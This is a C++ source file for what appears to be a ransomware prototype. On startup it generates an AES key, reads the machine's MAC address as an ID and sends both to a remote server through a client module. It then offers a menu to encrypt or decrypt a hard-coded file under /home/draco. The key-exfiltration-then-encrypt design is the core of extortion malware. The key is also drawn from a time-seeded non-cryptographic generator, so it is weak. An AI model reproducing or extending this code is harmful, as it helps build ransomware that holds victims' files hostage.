/*
 * (C)opyright 2023 Ramiz Abbasov <ramizna@code.edu.az>
 * See LICENSE file for license details
 */

#include <random>
#include <string>
#include <chrono>
#include <iomanip>
#include <fstream>
#include <cstring>
#include <iostream>
#include <unistd.h>
#include <net/if.h>
#include <ifaddrs.h>
#include <sys/ioctl.h>
#include <openssl/rand.h>

#include "client/client.hpp"
#include "encryption/encryptor.hpp"
#include "decryption/decryptor.hpp"

auto get_mac_address(const char* interface_name) -> std::string {
    std::int32_t sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr { };
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface_name, IFNAMSIZ - 1);

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        close(sock);
        return { };
    }

    close(sock);
    char mac_address[18] = { };
    snprintf(mac_address, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
             static_cast<std::uint_fast8_t>(ifr.ifr_hwaddr.sa_data[0]),
             static_cast<std::uint_fast8_t>(ifr.ifr_hwaddr.sa_data[1]),
             static_cast<std::uint_fast8_t>(ifr.ifr_hwaddr.sa_data[2]),
             static_cast<std::uint_fast8_t>(ifr.ifr_hwaddr.sa_data[3]),
             static_cast<std::uint_fast8_t>(ifr.ifr_hwaddr.sa_data[4]),
             static_cast<std::uint_fast8_t>(ifr.ifr_hwaddr.sa_data[5]));

    return std::string {mac_address};
}

auto print_interface_names() -> std::string {
    struct ifaddrs *ifaddr, *ifa;
    if (getifaddrs(&ifaddr) == -1) return "NON_ID";

    for (ifa = ifaddr; ifa != nullptr; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == nullptr) continue;
        if (ifa->ifa_flags & IFF_LOOPBACK) continue;
        return ifa->ifa_name;
    }
    freeifaddrs(ifaddr);
    return "NON_ID";
}

auto main_menu() -> void {
    std::cout << "[1] Encrypt the file" << std::endl;
    std::cout << "[2] Decrypt the file\n" << std::endl;
    std::cout << "[0] Exit" << std::endl;
}

auto test_encrypt(const char* in_file, const char* encr_out_file, const std::uint_fast8_t key[]) -> std::int32_t {
    std::uint_fast8_t iv[EVP_MAX_IV_LENGTH];
    if (!RAND_bytes(iv, EVP_MAX_IV_LENGTH)) {
        std::cerr << "[-] Error generating random IV" << std::endl;
        return -1;
    }

    std::ofstream iv_writer("/home/draco/IV.txt");
    for (std::uint_fast8_t i : iv) {
        iv_writer << "0x" << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(i);
        iv_writer << '\n';
    }
    iv_writer.close();

    int encrypted_bytes_written = Encryptor::encrypt(in_file, encr_out_file, key, iv);
    if (encrypted_bytes_written > 0) {
        std::cout << "[+] File encrypted successfully. " << encrypted_bytes_written << " bytes written.\n" << std::endl;
    } else {
        std::cerr << "[-] Error encrypting file" << std::endl;
    }

    return 0;
}

auto test_decrypt(const char* encr_out_file, const std::uint_fast8_t key[]) -> std::int32_t {
    std::uint_fast8_t iv[EVP_MAX_IV_LENGTH];
    std::ifstream iv_reader("/home/draco/IV.txt");

    for (std::uint_fast8_t &element : iv) {
        std::string hex_byte;
        if (!getline(iv_reader, hex_byte)) {
            std::cerr << "[-] Error reading IV from file" << std::endl;
            return -1;
        }
        element = static_cast<std::uint_fast8_t>(std::stoi(hex_byte, nullptr, 16));
    }
    iv_reader.close();

    const char* decr_out_file = "/home/draco/decrypted_output.txt";
    std::int32_t decrypted_bytes_written = Decryptor::decrypt(encr_out_file, decr_out_file, key, iv);
    if (decrypted_bytes_written > 0) {
        std::cout << "[+] File decrypted successfully. " << decrypted_bytes_written << " bytes written." << std::endl;
    } else {
        std::cerr << "[-] Error decrypting file" << std::endl;
    }

    return 0;
}

auto main() -> std::int32_t {
    unsigned seed = std::chrono::steady_clock::now().time_since_epoch().count();
    std::default_random_engine engine(seed);
    std::uint_fast8_t key[32];
    std::uniform_int_distribution<std::uint_fast8_t> keys(0, 255);
    for (std::uint_fast8_t &randoms : key) randoms = keys(engine);
    std::stringstream stream;

    for (std::uint_fast8_t rolls : key) {
        stream << "0x" << std::hex
               << std::setw(2)
               << std::setfill('0')
               << static_cast<int>(rolls) << std::endl;
    }

    std::string result = "ID: " + get_mac_address(print_interface_names().c_str()) + "\n" + stream.str();
    ClientSide::connection(result);

    const char* in_file = "/home/draco/tobe_encrypted.txt";
    const char* encr_out_file = "/home/draco/encrypted_output.txt";

    std::int32_t input;
    bool main_loop = true;

    while (main_loop) {
        main_menu();
        std::cout << "\n> ";
        std::cin >> input;

        switch (input) {
            case 1: test_encrypt(in_file, encr_out_file, key); break;
            case 2: test_decrypt(encr_out_file, key); break;
            case 0: main_loop = false; break;
            default: std::cout << "[-] Invalid command, Please try again" << std::endl;
        }
    }

    return 0;
}
